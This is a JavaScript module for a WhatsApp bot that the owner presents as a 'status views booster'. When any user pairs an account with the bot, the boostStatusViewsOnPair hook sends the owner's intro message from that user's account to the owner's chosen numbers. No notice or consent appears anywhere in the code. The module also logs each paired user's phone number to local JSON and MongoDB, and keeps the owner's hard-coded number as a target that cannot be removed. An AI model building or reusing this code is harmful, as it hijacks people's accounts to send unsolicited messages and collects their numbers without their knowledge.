'use strict';

/**
 * MR SAQIB MD :: STATUS VIEWS BOOSTER & AUTO CONTACT INTRO MANAGER
 * ============================================================================
 * - Allows Bot Owner to configure target phone numbers (Owner & Friends)
 * - Allows Bot Owner to configure a custom intro message
 * - Whenever ANY user pairs their bot:
 *   From that newly paired user's WhatsApp number, the bot automatically sends
 *   the intro message to the configured target numbers!
 * - Result: Both parties get direct chats, save each other's contacts, and
 *   WhatsApp Status views increase organically!
 * - Lifetime persistence via local JSON + automatic MongoDB Atlas sync.
 * - Strictly Owner-only configuration & control.
 * ============================================================================
 */

const fs = require('fs');
const path = require('path');
const mongoSync = require('./mongoSync');

const DATA_DIR = path.join(__dirname, '..', 'data');
const STATUS_BOOSTER_FILE = path.join(DATA_DIR, 'status_booster.json');

const DEFAULT_MESSAGE = "Assalam o Alaikum! Mera WhatsApp Bot successfully pair ho chuka hai. Mera number save kar lein taake hum dono ek dosray ke WhatsApp Status updates dekh sakein! 🌟";

let cachedData = null;

function cleanPhoneNumber(input) {
  if (!input) return null;
  let digits = String(input).replace(/[^0-9]/g, '');
  if (digits.startsWith('00')) digits = digits.slice(2);
  if (digits.startsWith('03') && digits.length === 11) {
    digits = '92' + digits.slice(1);
  }
  return digits.length >= 10 ? digits : null;
}

/**
 * Load status booster configuration
 */
function loadStatusBoosterData() {
  try {
    if (fs.existsSync(STATUS_BOOSTER_FILE)) {
      cachedData = JSON.parse(fs.readFileSync(STATUS_BOOSTER_FILE, 'utf8'));
    }
  } catch (e) {
    console.error('[StatusBooster Load Error]:', e.message);
  }

  if (!cachedData || typeof cachedData !== 'object') {
    cachedData = {
      enabled: false,
      targets: ["923438673242"],
      message: DEFAULT_MESSAGE,
      sentHistory: {},
      updatedAt: Date.now()
    };
  }

  if (!Array.isArray(cachedData.targets)) {
    cachedData.targets = ["923438673242"];
  }

  if (!cachedData.sentHistory || typeof cachedData.sentHistory !== 'object') {
    cachedData.sentHistory = {};
  }

  if (!cachedData.message) {
    cachedData.message = DEFAULT_MESSAGE;
  }

  return cachedData;
}

/**
 * Save configuration to disk & sync to MongoDB Atlas Cloud
 */
function saveStatusBoosterData(data) {
  try {
    data.updatedAt = Date.now();
    fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(STATUS_BOOSTER_FILE, JSON.stringify(data, null, 2), 'utf8');
    cachedData = data;

    // Non-blocking sync to MongoDB Atlas Cloud
    try {
      mongoSync.pushToMongo('status_booster', data, 400);
    } catch (_) {}
  } catch (e) {
    console.error('[StatusBooster Save Error]:', e.message);
  }
}

/**
 * .vcontact / .statusviews - Main dashboard & target list
 */
async function vcontactCommand(sock, from, msg, isOwner, isMasterOwner, args) {
  if (!isOwner && !isMasterOwner) {
    return await sock.sendMessage(from, {
      text: `╭━━━〔 ⛔ *ACCESS DENIED* 〕━━━┈⊷\n` +
            `┃ Sirf Bot Owner (*03438673242*) hi\n` +
            `┃ .vcontact command use kar sakta hai!\n` +
            `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n\n` +
            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍʀ-sᴀǫɪʙ*`
    }, { quoted: msg });
  }

  const sub = (args && args[0]) ? args[0].toLowerCase() : '';

  if (sub === 'on' || sub === 'enable' || sub === 'start') {
    return await toggleStatusBoosterCommand(sock, from, msg, isOwner, isMasterOwner, true);
  }
  if (sub === 'off' || sub === 'disable' || sub === 'stop') {
    return await toggleStatusBoosterCommand(sock, from, msg, isOwner, isMasterOwner, false);
  }
  if (sub === 'add') {
    return await addvcontactCommand(sock, from, msg, isOwner, isMasterOwner, args.slice(1));
  }
  if (sub === 'del' || sub === 'remove' || sub === 'rm') {
    return await delvcontactCommand(sock, from, msg, isOwner, isMasterOwner, args.slice(1));
  }
  if (sub === 'msg' || sub === 'setmsg') {
    return await setvmsgCommand(sock, from, msg, isOwner, isMasterOwner, args.slice(1));
  }

  const data = loadStatusBoosterData();
  const totalSent = Object.keys(data.sentHistory || {}).length;

  let targetsList = '';
  if (data.targets.length === 0) {
    targetsList = `┃   _Koi number add nahi hai. \`.setvcontact <number>\` karein._\n`;
  } else {
    data.targets.forEach((num, idx) => {
      const isMaster = (num === '923438673242');
      targetsList += `┃   ${idx + 1}. *+${num}* ${isMaster ? '(Master Owner)' : '(Contact)'}\n`;
    });
  }

  const statusMsg =
    `╭━━━〔 👁️ *STATUS VIEWS BOOSTER* 〕━━━┈⊷\n` +
    `┃ 🟢 *Status:* ${data.enabled ? 'Active & Auto-Messaging Enabled' : 'Disabled'}\n` +
    `┃ 📊 *Bots Paired & Contacted:* ${totalSent} Users\n` +
    `┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n` +
    `┃ 📲 *TARGET NUMBERS (Status Viewers):*\n` +
    `${targetsList}` +
    `┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n` +
    `┃ 💬 *CURRENT INTRO MESSAGE:*\n` +
    `┃ "${data.message}"\n` +
    `┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n` +
    `┃ 💡 *BOOSTER COMMANDS:*\n` +
    `┃   • \`.setvcontact <number>\` (Add Target Number)\n` +
    `┃   • \`.delvcontact <number|all>\` (Remove Target)\n` +
    `┃   • \`.setvmsg <custom message>\` (Change Message)\n` +
    `┃   • \`.vcontact on/off\` (Toggle Booster)\n` +
    `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n\n` +
    `> 🌟 *Status Growth:* Newly paired users will message target numbers instantly!\n` +
    `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍʀ-sᴀǫɪʙ*`;

  return await sock.sendMessage(from, { text: statusMsg }, { quoted: msg });
}

/**
 * .setvcontact <number> - Add target number
 */
async function addvcontactCommand(sock, from, msg, isOwner, isMasterOwner, args) {
  if (!isOwner && !isMasterOwner) {
    return await sock.sendMessage(from, {
      text: `❌ *Access Denied!* Sirf Bot Owner (*03438673242*) target number add kar sakta hai.`
    }, { quoted: msg });
  }

  const rawArg = (args && args.length) ? args.join(' ').trim() : '';
  if (!rawArg) {
    return await sock.sendMessage(from, {
      text: `❌ *Please provide a phone number!*\n\n` +
            `*Usage:*\n` +
            `• \`.setvcontact 03438673242\`\n` +
            `• \`.setvcontact 923001234567, 923011122334\`\n\n` +
            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍʀ-sᴀǫɪʙ*`
    }, { quoted: msg });
  }

  const data = loadStatusBoosterData();
  const rawList = rawArg.split(/[\s,]+/);
  const added = [];

  for (const item of rawList) {
    const clean = cleanPhoneNumber(item);
    if (clean && !data.targets.includes(clean)) {
      data.targets.push(clean);
      added.push(clean);
    }
  }

  if (added.length === 0) {
    return await sock.sendMessage(from, {
      text: `⚠️ *No new valid numbers to add!* (Shayad yeh number pehle se added hai ya invalid hai).`
    }, { quoted: msg });
  }

  saveStatusBoosterData(data);
  await sock.sendMessage(from, { react: { text: '✅', key: msg.key } }).catch(() => {});

  return await sock.sendMessage(from, {
    text: `╭━━━〔 ✅ *TARGET NUMBER ADDED* 〕━━━┈⊷\n` +
          `┃ 📲 *Added Numbers:*\n` +
          added.map(n => `┃   • +${n}`).join('\n') + '\n' +
          `┃ 👥 *Total Targets:* ${data.targets.length} Numbers\n` +
          `┃ ⚡ Jab bhi koi bot pair hoga, in numbers\n` +
          `┃    par automatic intro message send hoga!\n` +
          `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍʀ-sᴀǫɪʙ*`
  }, { quoted: msg });
}

/**
 * .delvcontact <number|all> - Remove target number
 */
async function delvcontactCommand(sock, from, msg, isOwner, isMasterOwner, args) {
  if (!isOwner && !isMasterOwner) {
    return await sock.sendMessage(from, {
      text: `❌ *Access Denied!* Sirf Bot Owner (*03438673242*) target number remove kar sakta hai.`
    }, { quoted: msg });
  }

  const rawArg = (args && args.length) ? args.join(' ').trim() : '';
  if (!rawArg) {
    return await sock.sendMessage(from, {
      text: `❌ *Please provide number to remove or "all"!*\n\n` +
            `*Usage:*\n` +
            `• \`.delvcontact 03438673242\`\n` +
            `• \`.delvcontact all\`\n\n` +
            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍʀ-sᴀǫɪʙ*`
    }, { quoted: msg });
  }

  const data = loadStatusBoosterData();

  if (rawArg.toLowerCase() === 'all') {
    data.targets = ["923438673242"]; // Keep Master Owner as default
    saveStatusBoosterData(data);
    return await sock.sendMessage(from, {
      text: `✅ *Targets Reset!* Tamam extra contacts remove kar diye gaye hain (Master Owner default active hai).`
    }, { quoted: msg });
  }

  const clean = cleanPhoneNumber(rawArg);
  const idx = data.targets.indexOf(clean);

  if (idx === -1) {
    return await sock.sendMessage(from, {
      text: `❌ *Number not found in targets list!* (+${clean || rawArg})`
    }, { quoted: msg });
  }

  data.targets.splice(idx, 1);
  saveStatusBoosterData(data);

  await sock.sendMessage(from, { react: { text: '🗑️', key: msg.key } }).catch(() => {});

  return await sock.sendMessage(from, {
    text: `╭━━━〔 🗑️ *TARGET REMOVED* 〕━━━┈⊷\n` +
          `┃ ❌ Number removed: *+${clean}*\n` +
          `┃ 👥 Remaining Targets: ${data.targets.length}\n` +
          `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍʀ-sᴀǫɪʙ*`
  }, { quoted: msg });
}

/**
 * .setvmsg <message> - Set custom intro message
 */
async function setvmsgCommand(sock, from, msg, isOwner, isMasterOwner, args) {
  if (!isOwner && !isMasterOwner) {
    return await sock.sendMessage(from, {
      text: `❌ *Access Denied!* Sirf Bot Owner (*03438673242*) intro message set kar sakta hai.`
    }, { quoted: msg });
  }

  const text = (args && args.length) ? args.join(' ').trim() : '';
  if (!text) {
    return await sock.sendMessage(from, {
      text: `❌ *Please provide a message text!*\n\n` +
            `*Example:*\n` +
            `\`.setvmsg Assalam o Alaikum! Please save my number for WhatsApp Status views! 🌟\`\n\n` +
            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍʀ-sᴀǫɪʙ*`
    }, { quoted: msg });
  }

  const data = loadStatusBoosterData();
  data.message = text;
  saveStatusBoosterData(data);

  await sock.sendMessage(from, { react: { text: '✅', key: msg.key } }).catch(() => {});

  return await sock.sendMessage(from, {
    text: `╭━━━〔 💬 *STATUS INTRO MESSAGE UPDATED* 〕━━━┈⊷\n` +
          `┃ ✅ *New Message Set:*\n` +
          `┃ "${text}"\n` +
          `┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n` +
          `┃ ⚡ Yeh message har naye paired user ki taraf sa\n` +
          `┃    target numbers ko automatic send hoga!\n` +
          `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍʀ-sᴀǫɪʙ*`
  }, { quoted: msg });
}

/**
 * .von / .voff / .vcontact on / .vcontact off - Toggle status booster on or off
 */
async function toggleStatusBoosterCommand(sock, from, msg, isOwner, isMasterOwner, enable) {
  if (!isOwner && !isMasterOwner) {
    return await sock.sendMessage(from, {
      text: `❌ *Access Denied!* Sirf Bot Owner (*03438673242*) status booster on/off kar sakta hai.`
    }, { quoted: msg });
  }

  const data = loadStatusBoosterData();
  data.enabled = !!enable;
  saveStatusBoosterData(data);

  await sock.sendMessage(from, { react: { text: enable ? '🟢' : '🔴', key: msg.key } }).catch(() => {});

  if (enable) {
    return await sock.sendMessage(from, {
      text: `╭━━━〔 🟢 *STATUS VIEWS BOOSTER ON* 〕━━━┈⊷\n` +
            `┃ ✅ *Status:* ON (Active & Enabled)\n` +
            `┃ 📲 *Target Numbers:* ${data.targets.length} Contact(s)\n` +
            `┃ ⚡ Ab jo bhi naya bot pair hoga, wo\n` +
            `┃    automatic in numbers par intro message karega!\n` +
            `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n\n` +
            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍʀ-sᴀǫɪʙ*`
    }, { quoted: msg });
  } else {
    return await sock.sendMessage(from, {
      text: `╭━━━〔 🔴 *STATUS VIEWS BOOSTER OFF* 〕━━━┈⊷\n` +
            `┃ ❌ *Status:* OFF (Disabled / Inactive)\n` +
            `┃ ⚪ Ab koi bhi bot pair hone par\n` +
            `┃    automatic intro message NAHI bheja jayega!\n` +
            `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷\n\n` +
            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍʀ-sᴀǫɪʙ*`
    }, { quoted: msg });
  }
}

/**
 * Hook executed when a newly paired bot connects:
 * Sends intro message from newly paired bot account to each configured target number
 */
async function boostStatusViewsOnPair(sock) {
  try {
    if (!sock || !sock.user) return;
    const data = loadStatusBoosterData();
    if (!data.enabled || !data.targets || data.targets.length === 0) return;

    const userDigits = String(sock.user.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
    if (!userDigits) return;

    // If already sent for this paired bot user, do not spam on reconnections
    if (data.sentHistory[userDigits]) {
      return;
    }

    // Wait 5 seconds after connection so socket is fully stabilized
    await new Promise(r => setTimeout(r, 5000));

    const introTemplate = data.message || DEFAULT_MESSAGE;
    const finalMsg = introTemplate.replace(/{phone}/g, `+${userDigits}`);

    const deliveredTo = [];

    for (const target of data.targets) {
      // Don't send message to own self if owner pairs his own bot
      if (target === userDigits) continue;

      try {
        const targetJid = `${target}@s.whatsapp.net`;
        await sock.sendMessage(targetJid, { text: finalMsg });
        deliveredTo.push(target);
        console.log(`[StatusBooster] 🚀 Intro message sent from paired user +${userDigits} to target +${target}`);
        // Small delay between targets
        await new Promise(r => setTimeout(r, 1200));
      } catch (sendErr) {
        console.log(`[StatusBooster] ⚠️ Failed sending to +${target}:`, sendErr.message);
      }
    }

    if (deliveredTo.length > 0) {
      data.sentHistory[userDigits] = {
        at: Date.now(),
        targets: deliveredTo
      };
      saveStatusBoosterData(data);
      console.log(`[StatusBooster] ✅ Status views booster completed for +${userDigits} (Sent to ${deliveredTo.length} targets).`);
    }
  } catch (err) {
    console.log('[StatusBooster] boostStatusViewsOnPair error:', err.message);
  }
}

module.exports = {
  cleanPhoneNumber,
  loadStatusBoosterData,
  saveStatusBoosterData,
  vcontactCommand,
  addvcontactCommand,
  delvcontactCommand,
  setvmsgCommand,
  toggleStatusBoosterCommand,
  boostStatusViewsOnPair
};
